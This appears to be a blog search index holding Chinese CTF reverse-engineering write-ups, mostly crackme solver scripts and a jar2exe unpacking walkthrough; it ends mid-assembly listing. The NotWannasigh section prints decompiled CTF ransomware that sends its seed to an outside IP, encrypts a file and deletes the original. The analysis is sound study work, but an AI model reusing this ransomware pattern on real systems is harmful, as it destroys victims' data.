<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>WPICTF-re-wp</title>
    <link href="/2020/04/20/WPICTF-re-wp/"/>
    <url>/2020/04/20/WPICTF-re-wp/</url>
    
    <content type="html"><![CDATA[<p>这次的比赛只有两道re，全都是malware，不难，也还挺有意思</p><a id="more"></a><h4 id="danger-Live-and-Malicious-Code"><a href="#danger-Live-and-Malicious-Code" class="headerlink" title="danger-Live-and-Malicious-Code"></a>danger-Live-and-Malicious-Code</h4><p>病毒的代码里面混进了flag，js的语法也不是特别懂，发现了很多处理字符串的函数，所以干脆<code>console.log</code>都输出了出来，发现输出的<code>url</code>中间夹了flag</p><pre><code>WPI{Oh_nose_procoding_detected}</code></pre><h4 id="NotWannasigh"><a href="#NotWannasigh" class="headerlink" title="NotWannasigh"></a>NotWannasigh</h4><p>首先看下<code>ransom note</code></p><pre><code>Haha! Your precious file flag.gif has been encrypted by my new and improved ransomware NotWannasigh! You must send bitcoin to &quot;bitpay.com/83768&quot; to get the decryption key. You should act fast because in 48 hours I will delete the key. Muahahahaha! - def-not-h4ckah(Hi, CTF challenge creator here. You should _NEVER_ pay the ransom. If you send bitcoin to that BTC wallet then you will ONLY be donating to charity (and hey, that&#39;s really nice of you, Mental Health Hackers is a great organization). I will NOT send you the decryption key)</code></pre><p>题目中所给的<code>flag-gif.EnCiPhErEd</code>应该就是加密过的文件，解密就可以得到flag，给的流量包暂时不知道作用是什么，干脆先看看程序的实现</p><pre><code class="c++">*(_QWORD *)seed = time(0LL);  srand(seed[0]);  fd = socket(2, 1, 0);  if ( fd == -1 )  {    puts(&quot;could not create socket&quot;);  }  else  {    puts(&quot;created socket&quot;);    *(_DWORD *)&amp;addr.sa_data[2] = inet_addr(&quot;108.61.127.136&quot;);    addr.sa_family = 2;    *(_WORD *)addr.sa_data = htons(0x50u);    if ( connect(fd, &amp;addr, 0x10u) &gt;= 0 )    {      puts(&quot;connected&quot;);      sprintf(&amp;s, &quot;%d&quot;, *(_QWORD *)seed);      if ( send(fd, &amp;s, 0xAuLL, 0) &gt;= 0 )        puts(&quot;sent&quot;);      else        puts(&quot;send failed&quot;);    }    else    {      puts(&quot;connect error&quot;);    }  }</code></pre><p>先根据当前时间生成了一个随机数种子，然后进行通信，把这个种子发给了一个ip，这个种子肯定是后面生成随机数用的，所以肯定是有用的，这也就是流量包的作用，根据流量信息可以获得这个随机数种子的值<code>1585599106</code></p><p>下面生成了一个随机数序列</p><pre><code class="c++">  puts(&quot;targetting flag.gif&quot;);  stream = fopen(&quot;flag.gif&quot;, &quot;r+&quot;);  fseek(stream, 0LL, 2);  v19 = ftell(stream);  fseek(stream, 0LL, 0);  printf(&quot;fileSize = %d\n&quot;, (unsigned int)v19);  v18 = v19 - 1LL;  v8 = v19;  v9 = 0LL;  v3 = alloca(16 * ((v19 + 15LL) / 0x10uLL));  v17 = &amp;v6;  for ( i = 0; i &lt; v19; ++i )    *((_BYTE *)v17 + i) = rand();  puts(&quot;key generated by 256&quot;);</code></pre><p>生成了key，下面是加密过程</p><pre><code class="c++">for ( j = 0; ; ++j )  {    v14 = fgetc(stream);    if ( j &gt;= v19 )      break;    *((_BYTE *)v15 + j) = v14 ^ *((_BYTE *)v17 + j);  }  fclose(stream);  remove(&quot;flag.gif&quot;);  v13 = fopen(&quot;flag-gif.EnCiPhErEd&quot;, &quot;w+&quot;);  for ( k = 0; k &lt; v19; ++k )    fputc(*((unsigned __int8 *)v15 + k), v13);  fclose(v13);</code></pre><p>简单异或之后写入文件，所以生成随机数序列之后再异或回来就好了</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstdio&gt;using namespace std;int main(){    srand(1585599106);    FILE *s = fopen(&quot;../flag-gif.EnCiPhErEd&quot;, &quot;r&quot;);    int index = 0;    FILE *f = fopen(&quot;../flag.gif&quot;, &quot;w+&quot;);    while (!feof(s))    {        int uVar1 = rand()&amp;0xff;        int8_t tmp2=fgetc(s);        int8_t tmp = uVar1 ^ tmp2;        fputc(tmp, f);        index = (int32_t)index + 1;    }    fclose(s);    fclose(f);    return 0;}</code></pre><p>这个脚本要在linux下跑，因为win的随机数生成的不一样</p><p>得到了含有flag的gif</p><p><img src="/2020/04/20/WPICTF-re-wp/WPICTF-re-wp%5Cflag.gif" srcset="/img/loading.gif" alt="flag"></p><p>flag有点难读，第一遍还读错了一位</p><pre><code>WPI{It_always_feels_a_little_weird_writing_malware}</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
      <tag>b01lersCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fibonacci-JavisOJ-wp</title>
    <link href="/2020/04/01/Fibonacci-JavisOJ-wp/"/>
    <url>/2020/04/01/Fibonacci-JavisOJ-wp/</url>
    
    <content type="html"><![CDATA[<p>这题涉及到<code>jar2exe</code>的知识，所以单独拿出来写一下，顺便写一写<code>jar2exe</code>怎么入手</p><a id="more"></a><blockquote><p>这种方法并不适用于<code>jar2exe</code>当前的最新版(2.1.7)，经过我的测试2.1.2试可用的，而且由于2.1.2的第三种加密方式还没有这么激进，后续其它版本应该也是支持的，还需要再试验。</p></blockquote><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>拿到题目<code>DIE</code>查一下，发现不是一个普通的可执行文件</p><p><img src="/2020/04/01/Fibonacci-JavisOJ-wp/1.png" srcset="/img/loading.gif" alt="1"></p><p>也就是说这本来是一个<code>jar</code>文件，通过<code>jar2exe</code>的方式转换成了windows可执行文件</p><h4 id="Jar2Exe"><a href="#Jar2Exe" class="headerlink" title="Jar2Exe"></a>Jar2Exe</h4><p>一共有3种保护方式</p><ul><li>不隐藏也不加密</li><li>隐藏</li><li>隐藏且加密</li></ul><h5 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h5><p>第一种方式非常简单，只需要在16进制编辑器中找到第一个<code>PK</code>，即<code>zip</code>的文件头，然后把这之后的另存为新文件，就可以了。但是这一题并不是采用这种方式，以这种方式提取出来的程序只包含很多生成出来的附加文件。</p><p><del>其实也可以直接用<code>winrar</code>打开</del></p><h5 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h5><p>第二种方式隐藏了原本的<code>jar</code>文件，可以通过<code>RH</code>来查看文件，这部分被放在了<code>RCData</code>里</p><p><img src="/2020/04/01/Fibonacci-JavisOJ-wp/2.png" srcset="/img/loading.gif" alt="1"></p><h5 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h5><p>本题采用的是第三种，就像第二种一样，原先的<code>jar</code>文件被隐藏了，但是第三种方式还进行加密，并且将整个<code>jar</code>文件的结构和类名全部都混淆了(经过实验在<code>jar2exe 2.1.2</code>中并不会对文件结构进行破坏)，不会像第二种方式中直接<code>dump</code>出来一个完整的<code>jar</code>文件</p><h4 id="Dump"><a href="#Dump" class="headerlink" title="Dump"></a>Dump</h4><p>要解决这道题首先就是要把有效的代码<code>Dump</code>出来，这部分的内容对于第二种和第三种方式是基本一样的。</p><p>从上面可以看到这段密文的偏移，然后<code>x64dbg</code>打开之后，在程序内存处根据偏移找到这段内存，设内存访问断点，程序运行起来，在<code>dec r8d</code>处停下来，此时如果是采用第二种方式加密，经过一个简单的循环之后就可以把原<code>jar</code>给<code>dump</code>出来，但是这里还需要经过一些加密</p><p><img src="/2020/04/01/Fibonacci-JavisOJ-wp/3.png" srcset="/img/loading.gif" alt="3"></p><p>根据脱壳的经验，找到向上跳转的最外层，就是最后一个跳转，然后直接执行到下一行</p><p><img src="/2020/04/01/Fibonacci-JavisOJ-wp/4.png" srcset="/img/loading.gif" alt="4"></p><p>首先观察变红色的值即发生改变的值，发现<code>r14</code>和<code>r15</code>的值很可疑，观察前面的代码，发现会在循环处<code>inc r15d</code>和<code>inc r14</code>，根据这两个寄存器的值推断，<code>r14</code>中的值是解密后数据的结束位置，<code>r15</code>中的值<code>B8B</code>为解密后数据的长度，因此，利用<code>Scylla</code>把这部分内容<code>dump</code>出来，出题人使用的<code>jar2exe</code>版本里面的文件名都是混淆过的，需要手动修复成<code>jar</code>文件，找到其中的两个<code>class</code>文件，<code>IDEA</code>直接就可以反编译。</p><h4 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h4><p><code>dump</code>出来的文件包含了两个类，第一个类包含主要的处理过程</p><pre><code class="java">//// Source code recreated from a .class file by IntelliJ IDEA// (powered by Fernflower decompiler)//package top.phrack.ctf.Fibonacci;import java.util.Scanner;public class Fibonacci {    public Fibonacci() {    }    private static void heheda() {        String bb = new String(b.x);        String cb = new String(b.y);        hello(cb, bb);    }    public static void main(String[] args) {        System.out.println(&quot;来让我们玩一个数列游戏：&quot;);        System.out.println(&quot;a[0]=0,a[1]=1&quot;);        System.out.println(&quot;a[2]=1,a[3]=2&quot;);        System.out.println(&quot;a[4]=3,a[5]=5&quot;);        System.out.println(&quot;..............&quot;);        System.out.println(&quot;请计算a[100000000000000]：&quot;);        Scanner scan = new Scanner(System.in);        String read = scan.nextLine();        System.out.println(&quot;答案错误！！&quot;);    }    private static String hello(String aaa, String bbb) {        int[] iS = new int[256];        byte[] iK = new byte[256];        int j;        for(j = 0; j &lt; 256; iS[j] = j++) {        }        int j = true;        for(short i = 0; i &lt; 256; ++i) {            iK[i] = (byte)bbb.charAt(i % bbb.length());        }        j = 0;        int i;        for(i = 0; i &lt; 255; ++i) {            j = (j + iS[i] + iK[i]) % 256;            int temp = iS[i];            iS[i] = iS[j];            iS[j] = temp;        }        i = 0;        j = 0;        char[] iInputChar = aaa.toCharArray();        char[] iOutputChar = new char[iInputChar.length];        for(short x = 0; x &lt; iInputChar.length; ++x) {            i = (i + 1) % 256;            j = (j + iS[i]) % 256;            int temp = iS[i];            iS[i] = iS[j];            iS[j] = temp;            int t = (iS[i] + iS[j] % 256) % 256;            int iY = iS[t];            char iCY = (char)iY;            iOutputChar[x] = (char)(iInputChar[x] ^ iCY);        }        return new String(iOutputChar);    }}</code></pre><p>由此可见什么斐波那契数列并没有什么用，真正有用的是<code>heheda()</code>和<code>hello()</code>，其中调用了<code>b</code>类的数据</p><pre><code class="java">//// Source code recreated from a .class file by IntelliJ IDEA// (powered by Fernflower decompiler)//package top.phrack.ctf.Fibonacci;public class b {    public static char[] x = new char[]{&#39;}&#39;, &#39;\u0010&#39;, &#39;ý&#39;, &#39;É&#39;, &#39;\u000b&#39;, &#39;\u0016&#39;, &#39;9&#39;, &#39;D&#39;, &#39;7&#39;, &#39;,&#39;, &#39; &#39;, &#39;Í&#39;};    public static char[] y = new char[]{&#39;t&#39;, &#39;\u0096&#39;, &#39;®&#39;, &#39;D&#39;, &#39;´&#39;, &#39;Z&#39;, &#39;Ö&#39;, &#39;½&#39;, &#39;O&#39;, &#39;5&#39;, &#39;\u0085&#39;, &#39;\n&#39;, &#39;+&#39;, &#39;+&#39;, &#39;½&#39;, &#39;Ù&#39;, &#39;O&#39;, &#39;`&#39;, &#39;\u0013&#39;, &#39;\u008a&#39;, &#39;Ç&#39;, &#39;\u0080&#39;, &#39;@&#39;, &#39;Ü&#39;, &#39;Þ&#39;, &#39;ê&#39;, &#39;\u000b&#39;, &#39;¯&#39;, &#39;ä&#39;, &#39;\u0081&#39;};    public b() {    }}</code></pre><p>所以直接在<code>java</code>环境里运行一下就可以了</p><pre><code class="java">//Main.javapackage com.company;public class Main {    private static void heheda() {        String bb = new String(b.x);        String cb = new String(b.y);        System.out.println(hello(cb, bb));    }    public static void main(String[] args) {        heheda();    }    private static String hello(String aaa, String bbb) {        int[] iS = new int[256];        byte[] iK = new byte[256];        int j;        for (j = 0; j &lt; 256; iS[j] = j++) {        }        for (short i = 0; i &lt; 256; ++i) {            iK[i] = (byte) bbb.charAt(i % bbb.length());        }        j = 0;        int i;        for (i = 0; i &lt; 255; ++i) {            j = (j + iS[i] + iK[i]) % 256;            int temp = iS[i];            iS[i] = iS[j];            iS[j] = temp;        }        i = 0;        j = 0;        char[] iInputChar = aaa.toCharArray();        char[] iOutputChar = new char[iInputChar.length];        for (short x = 0; x &lt; iInputChar.length; ++x) {            i = (i + 1) % 256;            j = (j + iS[i]) % 256;            int temp = iS[i];            iS[i] = iS[j];            iS[j] = temp;            int t = (iS[i] + iS[j] % 256) % 256;            int iY = iS[t];            char iCY = (char) iY;            iOutputChar[x] = (char) (iInputChar[x] ^ iCY);        }        return new String(iOutputChar);    }}//b.javapackage com.company;public class b {    public static char[] x = new char[]{&#39;}&#39;, &#39;\u0010&#39;, &#39;ý&#39;, &#39;É&#39;, &#39;\u000b&#39;, &#39;\u0016&#39;, &#39;9&#39;, &#39;D&#39;, &#39;7&#39;, &#39;,&#39;, &#39; &#39;, &#39;Í&#39;};    public static char[] y = new char[]{&#39;t&#39;, &#39;\u0096&#39;, &#39;®&#39;, &#39;D&#39;, &#39;´&#39;, &#39;Z&#39;, &#39;Ö&#39;, &#39;½&#39;, &#39;O&#39;, &#39;5&#39;, &#39;\u0085&#39;, &#39;\n&#39;, &#39;+&#39;, &#39;+&#39;, &#39;½&#39;, &#39;Ù&#39;, &#39;O&#39;, &#39;`&#39;, &#39;\u0013&#39;, &#39;\u008a&#39;, &#39;Ç&#39;, &#39;\u0080&#39;, &#39;@&#39;, &#39;Ü&#39;, &#39;Þ&#39;, &#39;ê&#39;, &#39;\u000b&#39;, &#39;¯&#39;, &#39;ä&#39;, &#39;\u0081&#39;};    public b() {    }}</code></pre><p>运行直接输出flag</p><pre><code>PCTF{1ts_not_5c2ipt_Chall3nge}</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
      <tag>re</tag>
      
      <tag>Javis OJ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javis-OJ-wp</title>
    <link href="/2020/04/01/Javis-OJ-wp/"/>
    <url>/2020/04/01/Javis-OJ-wp/</url>
    
    <content type="html"><![CDATA[<p>Javis OJ的题目还是很不错的，可以仔细研究研究</p><a id="more"></a><h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><h4 id="Findkey"><a href="#Findkey" class="headerlink" title="Findkey"></a>Findkey</h4><p><code>DIE</code>看看发现是<code>pyc</code>文件，试一下<code>uncompyle6</code>发现直接成功没加任何保护，看看代码</p><pre><code class="python">import syslookup = [ 196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139]pwda = [ 188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]pwdb = [53, 222, 230, 35, 67, 248, 226, 216, 17, 209, 32, 2, 181, 200, 171, 60, 108]flag = raw_input(&#39;Input your Key:&#39;).strip()if len(flag) != 17:    print &#39;Wrong Key!!&#39;    sys.exit(1)flag = flag[::-1]for i in range(0, len(flag)):    if ord(flag[i]) + pwda[i] &amp; 255 != lookup[(i + pwdb[i])]:        print &#39;Wrong Key!!&#39;        sys.exit(1)print &#39;Congratulations!!&#39;</code></pre><p>简单写个脚本逆一下</p><pre><code class="python">lookup = [    196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2,    245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224,    69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73,    148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22,    55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186,    0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113,    79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185,    183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9,    136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208,    207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120,    195, 45, 4, 142, 139]pwda = [    188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]pwdb = [53, 222, 230, 35, 67, 248, 226, 216, 17, 209, 32, 2, 181, 200, 171, 60, 108]flag = &#39;&#39;for i in range(17):    index = 16 - i    flag += chr((lookup[(index + pwdb[index])] - pwda[index])&amp;255)print(flag)# PCTF{PyC_Cr4ck3r}</code></pre><h4 id="Classical-Crackme"><a href="#Classical-Crackme" class="headerlink" title="Classical Crackme"></a>Classical Crackme</h4><p>这题有<code>confuser</code>的混淆，想脱掉这个壳有点困难，所以先看看代码</p><pre><code class="c#">private void \u202C\u200B\u206A\u202A\u206D\u206B\u202D\u206F\u202D\u200C\u200E\u206B\u202E\u202E\u202C\u202B\u206A\u206D\u206E\u202B\u206E\u200F\u202D\u200E\u202C\u200F\u200D\u200F\u202B\u200C\u202A\u206D\u206A\u206E\u202D\u200D\u200C\u206B\u202A\u202D\u202E(object A_1, EventArgs A_2)    {        string s = this.\u200E\u206F\u206A\u200F\u206E\u202C\u206C\u200C\u206A\u200B\u206E\u202D\u206B\u202D\u200F\u206B\u202B\u200C\u206B\u202D\u206D\u202B\u206B\u200C\u206F\u206D\u206A\u202D\u200F\u202E\u200B\u206D\u202C\u200D\u200D\u202C\u200F\u202E\u202E\u206A\u202E.Text.ToString();        byte[] bytes = Encoding.Default.GetBytes(s);        string a = Convert.ToBase64String(bytes);        string b = &quot;UENURntFYTV5X0RvX05ldF9DcjRjazNyfQ==&quot;;        if (a == b)        {            MessageBox.Show(&quot;注册成功！&quot;, &quot;提示&quot;, MessageBoxButtons.OK);        }        else        {            MessageBox.Show(&quot;注册失败！&quot;, &quot;提示&quot;, MessageBoxButtons.OK, MessageBoxIcon.Hand);        }    }</code></pre><p>找到关键部分，发现是简单对输入<code>base64</code>处理，然后直接对比，所以<code>base64</code>解码之后就可以了</p><h4 id="Classic-Crackme2"><a href="#Classic-Crackme2" class="headerlink" title="Classic Crackme2"></a>Classic Crackme2</h4><p>这题和上一个基本相似，也是<code>c#</code>+<code>confuser</code>，不过这次想直接找到关键代码有点困难，所以调试解决，在主函数下断点</p><p><img src="/2020/04/01/Javis-OJ-wp/Classic_Crackme-1.png" srcset="/img/loading.gif" alt="Classic_Crackme-1"></p><p>断点处这一串奇怪的字符串名应该就是关键的类，启动调试，跟进去</p><p>调试过程中发现了关键的比较</p><p><img src="/2020/04/01/Javis-OJ-wp/Classic_Crackme-2.png" srcset="/img/loading.gif" alt="Classic_Crackme-2"></p><p><code>text1</code>是我们的输入，去看看<code>text2</code>是什么</p><p><img src="/2020/04/01/Javis-OJ-wp/Classic_Crackme-3.png" srcset="/img/loading.gif" alt="Classic_Crackme-3"></p><p>发现加密方式是<code>AES-ECB</code>方式加密，填充方式也已知，<code>key</code>在局部变量窗口可以获得，最后应该还有个比较，接着调试</p><p><img src="/2020/04/01/Javis-OJ-wp/Classic_Crackme-4.png" srcset="/img/loading.gif" alt="Classic_Crackme-4"></p><p>发现了我们的输入被加密之后和另一串进行了一个比较，然后就可以写个脚本来跑一跑</p><pre><code class="python">import base64from Crypto.Cipher import AEScipher = &quot;x/nzolo0TTIyrEISd4AP1spCzlhSWJXeNbY81SjPgmk=&quot;cipher = base64.b64decode(cipher)key=&quot;pctf2016pctf2016pctf2016pctf2016&quot;cryptor = AES.new(key, AES.MODE_ECB)plain_text = cryptor.decrypt(cipher)print(plain_text)#b&#39;PCTF{Dot_Net_UnPack3r_yoo}\x06\x06\x06\x06\x06\x06&#39;</code></pre><h4 id="Smali"><a href="#Smali" class="headerlink" title="Smali"></a>Smali</h4><p><code>Smali</code>的语法我还是不是很会，不过这题比较简单，可以很容易看出来，也是简单的AES加密</p><pre><code class="python">import base64from Crypto.Cipher import AEScipher = &quot;sSNnx1UKbYrA1+MOrdtDTA==&quot;cipher = base64.b64decode(cipher)key = &quot;cGhyYWNrICBjdGYgMjAxNg==&quot;key = base64.b64decode(key)cryptor = AES.new(key, AES.MODE_ECB)plain_text = cryptor.decrypt(cipher)print(plain_text)#b&#39;PCTF{Sm4liRiver}&#39;</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
      <tag>re</tag>
      
      <tag>Javis OJ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MRCTF-wp</title>
    <link href="/2020/03/30/MRCTF-wp/"/>
    <url>/2020/03/30/MRCTF-wp/</url>
    
    <content type="html"><![CDATA[<p>最近招新事情实在是有点多，这比赛只打了半天，做了几道re和简单的pwn，随便写一下</p><a id="more"></a><h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><h4 id="transform"><a href="#transform" class="headerlink" title="transform"></a>transform</h4><p>太简单了没什么好说的，直接上代码</p><pre><code class="c++">#include&lt;iostream&gt;#include &quot;ida.h&quot;using namespace std;int main(){    signed int dword_40F040[33] =            {                    9,                    10,                    15,                    23,                    7,                    24,                    12,                    6,                    1,                    16,                    3,                    17,                    32,                    29,                    11,                    30,                    27,                    22,                    4,                    13,                    19,                    20,                    21,                    2,                    25,                    5,                    31,                    8,                    18,                    26,                    28,                    14,                    0            };    char target[33] =            {                    103,                    121,                    123,                    127,                    117,                    43,                    60,                    82,                    83,                    121,                    87,                    94,                    93,                    66,                    123,                    45,                    42,                    102,                    66,                    126,                    76,                    87,                    121,                    65,                    107,                    126,                    101,                    60,                    92,                    69,                    111,                    98,                    77            };    char tmp[33];    char flag[33];    for(int i=0;i&lt;=32;i++)    {        tmp[i]=target[i]^LOBYTE(dword_40F040[i]);        flag[dword_40F040[i]]=tmp[i];    }    cout&lt;&lt;flag&lt;&lt;endl;    return 0;}</code></pre><h4 id="撸啊撸"><a href="#撸啊撸" class="headerlink" title="撸啊撸"></a>撸啊撸</h4><p>简单的<code>lua</code>，用了<code>smc</code>，但是调试可以之间看到执行的代码，复制出来即可</p><pre><code class="lua">cmps={{83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97}}print(\&quot;Give Me Your Flag LOL!:\&quot;)flag=io.read()if string.len(flag)~=28 then    print(\&quot;Wrong flag!\&quot;)    os.exit()endfor i=1,string.len(flag) do    local x=string.byte(flag,i)    if i%2==0 then        x=x~i    else        x=x+6    end    if x~=cmps[i] then        print(\&quot;Wrong flag!\&quot;)        os.exit()    endendprint(\&quot;Right flag!\&quot;)os.exit()</code></pre><p>判断的逻辑也很简单，分奇偶进行不同的操作，用python跑一遍就可以出来flag</p><pre><code class="python">cmps = [83, 80, 73, 80, 76, 125, 61, 96, 107, 85, 62, 63, 121, 122, 101, 33, 123, 82, 101, 114, 54, 100, 101, 97, 85,        111, 39, 97]flag=&#39;&#39;for i in range(28):    x = cmps[i]    if (i + 1) % 2 == 0:        x ^= (i + 1)    else:        x -= 6    flag+=chr(x)print(flag)</code></pre><h4 id="PixelShooter"><a href="#PixelShooter" class="headerlink" title="PixelShooter"></a>PixelShooter</h4><p>游戏我是一点都不会打，直接解包找到<code>dll</code>在字符串视图可以直接看到<code>flag</code></p><h4 id="hello-world-go"><a href="#hello-world-go" class="headerlink" title="hello_world_go"></a>hello_world_go</h4><p>乱七八糟看了就觉得头疼的<code>go</code></p><p>找到主函数</p><pre><code class="c++">__int64 __fastcall main_main(__int64 a1, __int64 a2){  __int64 v2; // r8  __int64 v3; // r9  __int64 v4; // r8  __int64 v5; // r9  __int64 v6; // rdx  __int64 v7; // r8  __int64 v8; // rcx  __int64 v9; // rdx  __int64 v10; // r9  signed __int64 v11; // rax  __int64 result; // rax  __int64 v13; // ST58_8  __int64 *v14; // [rsp+8h] [rbp-A8h]  char v15; // [rsp+18h] [rbp-98h]  __int64 *v16; // [rsp+60h] [rbp-50h]  __int128 v17; // [rsp+68h] [rbp-48h]  void *v18; // [rsp+78h] [rbp-38h]  void **v19; // [rsp+80h] [rbp-30h]  __int128 v20; // [rsp+88h] [rbp-28h]  __int128 v21; // [rsp+98h] [rbp-18h]  if ( (unsigned __int64)&amp;v19 &lt;= *(_QWORD *)(__readfsqword(0xFFFFFFF8) + 16) )    runtime_morestack_noctxt();  runtime_newobject(a1, a2);  v16 = v14;  *(_QWORD *)&amp;v21 = &amp;unk_4AC9C0;  *((_QWORD *)&amp;v21 + 1) = &amp;off_4EA530;  fmt_Fprint(a1, a2, (__int64)&amp;v21, (__int64)&amp;unk_4AC9C0, v2, v3, (__int64)&amp;off_4EBDA0, qword_577550);  *(_QWORD *)&amp;v20 = &amp;unk_4A96A0;  *((_QWORD *)&amp;v20 + 1) = v16;  fmt_Fscanf(    a1,    a2,    (__int64)&amp;off_4EBD80,    (__int64)&amp;v20,    v4,    v5,    (__int64)&amp;off_4EBD80,    qword_577548,    (__int64)&amp;unk_4D07C9,    2LL);  v8 = v16[1];  if ( v8 != 24 )    goto LABEL_3;  v13 = *v16;  runtime_memequal(a1, a2, v6, (unsigned __int64)&amp;unk_4D3C58);  if ( !v15 )  {    v8 = 24LL;LABEL_3:    runtime_cmpstring(a1, a2, (__int64)&amp;unk_4D3C58, v8, v7);    if ( (signed __int64)&amp;v20 &gt;= 0 )      v11 = 1LL;    else      v11 = -1LL;    goto LABEL_5;  }  v11 = 0LL;LABEL_5:  if ( v11 )  {    *(_QWORD *)&amp;v17 = &amp;unk_4AC9C0;    *((_QWORD *)&amp;v17 + 1) = &amp;off_4EA550;    result = fmt_Fprintln(a1, a2, v9, (__int64)&amp;off_4EBDA0, v7, v10, (__int64)&amp;off_4EBDA0, qword_577550);  }  else  {    v18 = &amp;unk_4AC9C0;    v19 = &amp;off_4EA540;    result = fmt_Fprintln(a1, a2, v9, (__int64)&amp;off_4EBDA0, v7, v10, (__int64)&amp;off_4EBDA0, qword_577550);  }  return result;}</code></pre><p>看到了输出提示语，然后输入，最后进行字符串比较，输出正误，没见到有什么特殊的处理，猜测直接<code>flag</code>明文比较，点进去，得到<code>flag</code></p><pre><code>flag{hello_world_gogogo}</code></pre><h4 id="junk"><a href="#junk" class="headerlink" title="junk"></a>junk</h4><p>这一题还像是一道正常难度的re……</p><p><img src="/2020/03/30/MRCTF-wp/junk-1.png" srcset="/img/loading.gif" alt="junk-1"></p><p>看起来很正常的流程图，但是接下来就发现<code>F5</code>大法不好使了，猜测题目<code>junk</code>的意思应该是加了混淆，所以干脆直接看汇编</p><p>题目需要输入一个字符串并存储到了<code>0x4216A0</code>的位置，在<code>loc_401200</code>内进行判断，通过<code>eax</code>来判别是否正确，直接<code>call</code>一个位置说明在这个判断函数里动了很多手脚，进去看看</p><p><del>然后发现简直乱七八糟</del></p><pre><code class="asm">.text:00401200 loc_401200:                             ; CODE XREF: sub_401390+1E↓p.text:00401200                 push    ebp.text:00401201                 mov     ebp, esp.text:00401203                 sub     esp, 3Ch.text:00401206                 push    ebx.text:00401207                 push    esi.text:00401208                 push    edi.text:00401209                 mov     eax, [ebp+4].text:0040120C                 sub     esp, 0E9h.text:00401212                 push    eax.text:00401213                 mov     dword ptr [ebp-8], offset unk_4216A0.text:0040121A                 mov     eax, [ebp-8].text:0040121D                 add     eax, 1.text:00401220                 mov     [ebp-1Ch], eax.text:00401223.text:00401223 loc_401223:                             ; CODE XREF: .text:00401233↓j.text:00401223                 mov     ecx, [ebp-8].text:00401226                 mov     dl, [ecx].text:00401228                 mov     [ebp-1], dl.text:0040122B                 add     dword ptr [ebp-8], 1.text:0040122F                 cmp     byte ptr [ebp-1], 0.text:00401233                 jnz     short loc_401223.text:00401235                 mov     eax, 